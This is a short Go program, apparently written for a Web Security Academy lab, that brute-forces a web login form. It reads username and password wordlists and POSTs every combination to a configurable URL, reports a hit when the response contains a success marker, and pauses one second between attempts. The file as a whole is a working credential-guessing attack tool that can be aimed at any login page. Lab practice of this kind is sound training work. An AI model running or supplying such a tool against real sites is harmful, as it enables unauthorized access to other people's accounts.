package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"
)

func readCredentials(usernameFile, passwordFile string) ([]string, []string, error) {
	var usernames, passwords []string

	// Read usernames
	file, err := os.Open(usernameFile)
	if err != nil {
		return nil, nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		usernames = append(usernames, strings.TrimSpace(scanner.Text()))
	}
	if err := scanner.Err(); err != nil {
		return nil, nil, err
	}

	// Read passwords
	file, err = os.Open(passwordFile)
	if err != nil {
		return nil, nil, err
	}
	defer file.Close()

	scanner = bufio.NewScanner(file)
	for scanner.Scan() {
		passwords = append(passwords, strings.TrimSpace(scanner.Text()))
	}
	if err := scanner.Err(); err != nil {
		return nil, nil, err
	}

	return usernames, passwords, nil
}

func main() {
	// Parse command line arguments
	usernameFile := flag.String("u", "username.txt", "File containing usernames")
	passwordFile := flag.String("p", "password.txt", "File containing passwords")
	url := flag.String("url", "https://0a4d005c041be5ac80f2c60a00f000ac.web-security-academy.net/login/", "URL of the login form")
	flag.Parse()

	usernames, passwords, err := readCredentials(*usernameFile, *passwordFile)
	if err != nil {
		fmt.Println("Error reading credentials:", err)
		return
	}
    
	fmt.Println("Demmarage de l'attaque brute force sur le site: ", *url)

	for _, username := range usernames {
		for _, password := range passwords {
			data := fmt.Sprintf("username=%s&password=%s", username, password)
			req, err := http.NewRequest("POST", *url, bytes.NewBufferString(data))
			if err != nil {
				fmt.Println("Error creating request:", err)
				continue
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			client := &http.Client{}
			resp, err := client.Do(req)
			if err != nil {
				fmt.Println("Error sending request:", err)
				continue
			}

			body, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				fmt.Println("Error reading response:", err)
				continue
			}

			fmt.Printf("Trying %s:%s\n", username, password)
			fmt.Println("Status Code:", resp.StatusCode)

			if strings.Contains(string(body), "successful login indication") { // Adapter selon l'application
				fmt.Printf("Successful login with %s:%s\n", username, password)
				return
			}

			time.Sleep(1 * time.Second) // Attendre 1 seconde avant la prochaine requête
		}
	}
}
